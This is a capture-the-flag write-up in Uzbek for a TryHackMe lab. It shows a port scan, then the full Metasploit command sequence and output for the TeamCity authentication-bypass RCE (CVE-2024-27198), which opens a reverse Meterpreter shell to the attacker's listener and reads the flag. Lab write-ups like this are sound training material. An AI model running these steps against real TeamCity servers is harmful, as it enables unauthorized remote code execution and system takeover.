# Brain

Room: https://tryhackme.com/room/brains

CTF ikkiga bo'lingan RED va BLUE qismlarga avval REDdan boshlaymiz.

## Razvetka 

Avvalo ish razvetkadan.....

### PortScanning:

```
╭─mete   󰉖 ~
╰─ ❯❯ rustscan -a 10.10.169.102 -- -sV
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Scanning ports faster than you can say 'SYN ACK'

[~] The config file is expected to be at "/home/mete/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.10.169.102:22
Open 10.10.169.102:80
Open 10.10.169.102:50000
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} -{{ipversion}} {{ip}} -sV" on ip 10.10.169.102
Depending on the complexity of the script, results may take some time to appear.
[~] Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-09 16:01 +05
NSE: Loaded 47 scripts for scanning.
Initiating Ping Scan at 16:01
Scanning 10.10.169.102 [2 ports]
Completed Ping Scan at 16:01, 0.20s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 16:01
Completed Parallel DNS resolution of 1 host. at 16:01, 0.08s elapsed
DNS resolution of 1 IPs took 0.08s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 16:01
Scanning 10.10.169.102 [3 ports]
Discovered open port 80/tcp on 10.10.169.102
Discovered open port 22/tcp on 10.10.169.102
Discovered open port 50000/tcp on 10.10.169.102
Completed Connect Scan at 16:01, 0.20s elapsed (3 total ports)
Initiating Service scan at 16:01
Scanning 3 services on 10.10.169.102
Completed Service scan at 16:02, 19.61s elapsed (3 services on 1 host)
NSE: Script scanning 10.10.169.102.
NSE: Starting runlevel 1 (of 2) scan.
Initiating NSE at 16:02
Completed NSE at 16:02, 1.00s elapsed
NSE: Starting runlevel 2 (of 2) scan.
Initiating NSE at 16:02
Completed NSE at 16:02, 1.20s elapsed
Nmap scan report for 10.10.169.102
Host is up, received syn-ack (0.20s latency).
Scanned at 2025-07-09 16:01:42 +05 for 22s

PORT      STATE SERVICE REASON  VERSION
22/tcp    open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
80/tcp    open  http    syn-ack Apache httpd 2.4.41 ((Ubuntu))
50000/tcp open  http    syn-ack Apache Tomcat (language: en)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 22.46 seconds
```

50000 portda TeamCity paneli aniqlandi.

http://10.10.169.102:50000/login.html

Versiya: Version 2023.11.3 (build 147512)

Bunda zaifliklar bormi qidiramiz....



Topdik! **Metasploit**dan foydalanamiz.

```
msfconsole
```

```
use exploit/multi/http/jetbrains_teamcity_rce_cve_2024_27198
```

```
set RHOSTS 10.10.169.102
```

```
set RPORT 50000
```

```\
set LHOST 10.8.24.135
```

```
exploit
```

Natija:

```
msf6 exploit(multi/http/jetbrains_teamcity_rce_cve_2024_27198) > exploit
[*] Started reverse TCP handler on 10.8.24.135:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target is vulnerable. JetBrains TeamCity 2023.11.3 (build 147512) running on Linux.
[*] Created authentication token: eyJ0eXAiOiAiVENWMiJ9.MFN5OHUyTkQxMHZ0eUZJdDN5VURMVVJUR1dV.ZWU1ODJlN2UtMmI3MS00ZWJkLWE2MTEtN2U5MDc2ZmIzOTMz
[*] Uploading plugin: gGVS6Xs9
[*] Sending stage (58073 bytes) to 10.10.169.102
[*] Deleting the plugin...
[+] Deleted /opt/teamcity/TeamCity/work/Catalina/localhost/ROOT/TC_147512_gGVS6Xs9
[+] Deleted /home/ubuntu/.BuildServer/system/caches/plugins.unpacked/gGVS6Xs9
[*] Meterpreter session 1 opened (10.8.24.135:4444 -> 10.10.169.102:34472) at 2025-07-09 17:37:01 +0500
[*] Deleting the authentication token...
[!] This exploit may require manual cleanup of '/opt/teamcity/TeamCity/webapps/ROOT/plugins/gGVS6Xs9' on the target

meterpreter > 
```

**flag.txt**ni qo'lga kiritish:

```
meterpreter > pwd
/home/ubuntu
meterpreter > ls
Listing: /home/ubuntu
=====================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
040777/rwxrwxrwx  4096  dir   2025-07-09 15:58:58 +0500  .BuildServer
000667/rw-rw-rwx  0     fif   2025-07-09 15:57:57 +0500  .bash_history
100667/rw-rw-rwx  220   fil   2020-02-25 17:03:22 +0500  .bash_logout
100667/rw-rw-rwx  3771  fil   2020-02-25 17:03:22 +0500  .bashrc
040777/rwxrwxrwx  4096  dir   2024-07-02 14:39:13 +0500  .cache
040777/rwxrwxrwx  4096  dir   2024-08-02 13:54:40 +0500  .config
040777/rwxrwxrwx  4096  dir   2024-07-02 14:40:18 +0500  .local
100667/rw-rw-rwx  807   fil   2020-02-25 17:03:22 +0500  .profile
100667/rw-rw-rwx  66    fil   2024-07-02 14:59:35 +0500  .selected_editor
040777/rwxrwxrwx  4096  dir   2024-07-02 14:38:50 +0500  .ssh
100667/rw-rw-rwx  0     fil   2024-07-02 14:39:21 +0500  .sudo_as_admin_successful
100667/rw-rw-rwx  214   fil   2024-07-02 14:46:35 +0500  .wget-hsts
100666/rw-rw-rw-  4829  fil   2024-07-02 19:55:04 +0500  config.log
100666/rw-rw-rw-  38    fil   2024-07-02 15:05:47 +0500  flag.txt

meterpreter > cat flag.txt
THM{REDACTED}
```


# Nafas olar ekanman, davom etaman...
